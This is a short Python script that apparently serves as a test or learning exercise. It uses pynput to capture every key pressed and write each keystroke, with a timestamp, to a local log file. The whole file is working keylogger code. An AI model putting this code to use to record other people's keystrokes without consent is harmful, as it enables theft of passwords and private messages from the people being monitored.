from pynput import keyboard
import logging

# Set the log file path
log_file = "/home/shanks/Desktop/Test/key/keylog_output.txt"

# Configure loggng
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
